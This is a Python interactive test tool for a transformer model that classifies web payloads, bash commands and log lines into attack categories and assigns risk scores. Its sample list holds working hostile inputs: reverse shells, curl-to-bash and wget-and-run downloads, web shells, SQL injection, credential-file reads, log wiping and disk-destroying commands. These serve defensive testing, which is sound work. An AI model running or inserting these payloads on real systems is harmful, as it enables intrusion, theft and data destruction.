"""
interactive_test.py
===================
Interactive CLI Testing Tool for Enterprise VPS Security AI (48 Classes).
Contains a rich built-in collection of mixed Web & Server attack payloads.
"""

import random
from transformers import pipeline, AutoModelForSequenceClassification, AutoTokenizer

MODEL_DIR = "./trained_model"

# Built-in collection of mixed Web and Linux/Server attack payloads
SAMPLE_PAYLOADS = [
    # --- WEB ATTACKS ---
    ("SQL_Injection",                 "' OR 1=1 --"),
    ("SQL_Injection",                 "SELECT * FROM users WHERE id=1 UNION SELECT null, username, password FROM admin_users;--"),
    ("SQL_Injection",                 "1'; DROP TABLE orders;--"),
    ("XSS",                           "<script>alert('xss_vulnerability')</script>"),
    ("XSS",                           "<img src=x onerror=alert('cookie:'+document.cookie)>"),
    ("PathTraversal",                 "../../../../etc/passwd"),
    ("PathTraversal",                 "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fshadow"),
    ("SSRF",                          "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
    ("SSRF",                          "gopher://localhost:6379/_FLUSHALL"),
    ("XXE",                           "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"),
    ("NoSQL_Injection",               "{\"username\": {\"$gt\": \"\"}, \"password\": {\"$ne\": null}}"),
    ("Command_Injection",             "127.0.0.1; cat /etc/passwd"),
    ("FileUpload_Attack",            "filename=\"webshell.php.png\""),
    ("CSRF",                          "<form action=\"http://example.com/api/transfer\" method=\"POST\"><input type=\"hidden\" name=\"amount\" value=\"10000\"></form><script>document.forms[0].submit()</script>"),
    ("SSTI",                          "{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}"),

    # --- SERVER / LINUX ATTACKS ---
    ("SSH_BruteForce",                "Aug 04 14:30:00 server sshd[1234]: Failed password for root from 192.168.1.100 port 54321 ssh2"),
    ("SSH_BruteForce",                "Aug 04 14:30:05 server sshd[1235]: Failed password for invalid user admin from 45.33.32.156 port 41200 ssh2"),
    ("SSH_Login_Attack",              "Aug 04 14:31:00 server sshd[5678]: Invalid user test_account from 10.0.0.5 port 43210"),
    ("ReverseShell",                 "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"),
    ("ReverseShell",                 "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"192.168.1.50\",5555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"),
    ("PrivilegeEscalation",          "sudo -u root /usr/bin/find / -exec /bin/sh \\;"),
    ("PrivilegeEscalation",          "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash && /tmp/rootbash -p"),
    ("Suspicious_Bash_Command",       "history -c && unset HISTFILE && export HISTFILESIZE=0"),
    ("Suspicious_Bash_Command",       "shred -zu ~/.bash_history && echo '' > /var/log/auth.log"),
    ("Linux_Command_Injection",       "; rm -rf / --no-preserve-root"),
    ("WebShell",                      "<?php system($_GET['cmd']); ?>"),
    ("WebShell",                      "<?php echo shell_exec($_REQUEST['c']); ?>"),
    ("PortScanning",                 "nmap -sS -p 1-65535 192.168.1.0/24"),
    ("PortScanning",                 "masscan -p1-65535 10.0.0.0/16 --rate=10000"),
    ("Docker_Abuse",                  "docker run -v /:/mnt --rm -it alpine chroot /mnt sh"),
    ("Docker_Abuse",                  "docker run --privileged --pid=host -it alpine nsenter -t 1 -m -u -i -n -- /bin/bash"),
    ("Cron_Abuse",                    "echo '* * * * * root /tmp/backdoor.sh' >> /etc/crontab"),
    ("Cron_Abuse",                    "echo '*/5 * * * * curl http://192.168.1.50/c | bash' | crontab -"),
    ("Persistence",                   "echo 'ssh-rsa AAAA3NzaC1yc2E... attacker@evil' >> /root/.ssh/authorized_keys"),
    ("Persistence",                   "echo 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' >> /etc/profile"),
    ("Malicious_System_Command",      "dd if=/dev/urandom of=/dev/sda bs=1M count=1000"),
    ("Malicious_System_Command",      "mkfs.ext4 /dev/sda1"),
    ("Unauthorized_File_Modification", "chmod 4755 /tmp/rootkit; chown root:root /tmp/rootkit"),
    ("Unauthorized_File_Modification", "sed -i 's/PermitRootLogin no/PermitRootLogin yes/' /etc/ssh/sshd_config"),
    ("Suspicious_Process",            "root 1234 99.0 /tmp/.ICE-unix/xmrig -o stratum+tcp://pool.supportxmr.com:443"),
    ("System_Enumeration",            "cat /etc/passwd && uname -a && id && whoami"),
    ("System_Enumeration",            "ifconfig -a && netstat -tlnp && ps auxww"),
    ("Kernel_Exploit",                "./dirty_cow /usr/bin/passwd"),
    ("Kernel_Exploit",                "./CVE-2022-0847 # DirtyPipe LPE exploit"),
    ("Linux_Malware",                 "wget http://192.168.1.50/bot.sh -O /tmp/.hidden && chmod +x /tmp/.hidden && /tmp/.hidden"),
    ("Ransomware",                    "openssl enc -aes-256-cbc -in data.db -out data.db.locked -k secretkey123"),
    ("Cryptomining",                  "./xmrig --donate-level=0 -o pool.minexmr.com:3333 -u 4wallet..."),
    ("Failed_Login",                  "Aug 04 14:32:00 server sudo: pam_unix(sudo:auth): authentication failure; logname=user1"),
    ("Root_Login_Attempt",            "Aug 04 14:33:00 server sshd[9012]: Accepted password for root from 185.220.101.1 port 22 ssh2"),
    ("Lateral_Movement",              "scp /tmp/payload.sh user@10.0.0.2:/tmp/ && ssh user@10.0.0.2 'bash /tmp/payload.sh'"),

    # --- BENIGN TRAFFIC ---
    ("Benign",                        "GET /api/v1/products?category=electronics HTTP/1.1"),
    ("Benign",                        "POST /api/v1/users/login HTTP/1.1\nHost: example.com\n\nusername=john_doe&password=secretPass123!"),
    ("Benign",                        "Aug 04 14:35:00 server systemd[1]: Started Daily Cleanup of Temporary Directories."),
    ("Benign",                        "Aug 04 14:36:00 server sshd[1122]: Accepted publickey for deploy from 10.0.0.1 port 52100 ssh2"),
    ("Benign",                        "Aug 04 14:37:00 server CRON[1456]: (root) CMD (/usr/lib/php/sessionclean)"),
]

# Severity weights for risk calculation
ATTACK_SEVERITY_WEIGHTS = {
    "RCE": 1.00, "ReverseShell": 1.00, "Kernel_Exploit": 0.98, "Command_Injection": 0.98,
    "Linux_Command_Injection": 0.98, "Malicious_System_Command": 0.97, "PrivilegeEscalation": 0.96,
    "SQL_Injection": 0.95, "Malware": 0.95, "Linux_Malware": 0.95, "Ransomware": 0.95,
    "WebShell": 0.94, "Docker_Abuse": 0.93, "Persistence": 0.92, "XXE": 0.90,
    "Insecure_Deserialization": 0.90, "PathTraversal": 0.88, "FileUpload_Attack": 0.88,
    "XPATH_Injection": 0.88, "SSTI": 0.87, "Lateral_Movement": 0.87, "NoSQL_Injection": 0.85,
    "Cron_Abuse": 0.85, "Unauthorized_File_Modification": 0.84, "Root_Login_Attempt": 0.82,
    "Cryptomining": 0.80, "XSS": 0.80, "SSRF": 0.80, "GraphQL_Injection": 0.80,
    "Prototype_Pollution": 0.78, "LDAP_Injection": 0.78, "System_Enumeration": 0.76,
    "CSRF": 0.75, "OpenRedirect": 0.75, "Header_Injection": 0.72, "CRLF_Injection": 0.70,
    "Suspicious_Bash_Command": 0.70, "Suspicious_Process": 0.68, "SSH_BruteForce": 0.65,
    "BruteForce": 0.65, "CredentialStuffing": 0.65, "SSH_Login_Attack": 0.63,
    "PortScanning": 0.60, "DDoS": 0.60, "Failed_Login": 0.55, "Malicious_HTTP": 0.55,
    "Suspicious_Input": 0.50, "Benign": 0.00
}

def calculate_risk(prediction_label: str, confidence: float):
    severity = ATTACK_SEVERITY_WEIGHTS.get(prediction_label, 0.50)
    if prediction_label == "Benign":
        risk_pct = round((1.0 - confidence) * 15.0, 2)
        risk_lvl = "SAFE"
    else:
        raw_risk = (confidence * 0.70 + severity * 0.30) * 100.0
        risk_pct = round(min(raw_risk, 99.99), 2)
        if risk_pct >= 85.0:
            risk_lvl = "CRITICAL"
        elif risk_pct >= 65.0:
            risk_lvl = "HIGH"
        elif risk_pct >= 40.0:
            risk_lvl = "MEDIUM"
        else:
            risk_lvl = "LOW"
    return risk_pct, risk_lvl

print(f"Loading model from: {MODEL_DIR}...")
tokenizer = AutoTokenizer.from_pretrained(MODEL_DIR)
model = AutoModelForSequenceClassification.from_pretrained(MODEL_DIR)

classifier = pipeline(
    "text-classification",
    model=model,
    tokenizer=tokenizer,
    top_k=3,
    device=-1
)

num_classes = model.config.num_labels
print("\n" + "="*75)
print(f"🛡️  INTERACTIVE TEST MODE — ENTERPRISE VPS SECURITY AI ({num_classes} Classes)")
print("="*75)
print("  - Press [ENTER] to pull a random mixed payload (Web or Server attack).")
print("  - Type any custom string (web payload, log line, bash command) to evaluate.")
print("  - Type 'quit' or 'exit' to stop.")
print("="*75 + "\n")

while True:
    try:
        user_input = input("Payload / Log (or Press ENTER for random sample) > ").strip()
        
        if user_input.lower() in ['quit', 'exit']:
            print("\nExiting interactive test. Goodbye!")
            break
            
        if not user_input:
            expected_category, text = random.choice(SAMPLE_PAYLOADS)
            print(f"\n[Random Sample — Category: {expected_category}]")
        else:
            text = user_input
            print(f"\n[Custom Input Evaluation]")
            
        print(f"Input : {text}")
        
        scores = classifier(text)[0]
        best = scores[0]
        top3 = [(s['label'], round(s['score'], 4)) for s in scores]
        
        pred_label = best['label']
        conf_score = best['score']
        risk_pct, risk_lvl = calculate_risk(pred_label, conf_score)
        
        print(f"Prediction : {pred_label:<25} (Confidence: {conf_score:.4f})")
        print(f"Risk Score : {risk_pct:>6.2f}% [{risk_lvl}]")
        print(f"Top 3      : {top3}\n")
        
    except KeyboardInterrupt:
        print("\nExiting interactive test. Goodbye!")
        break
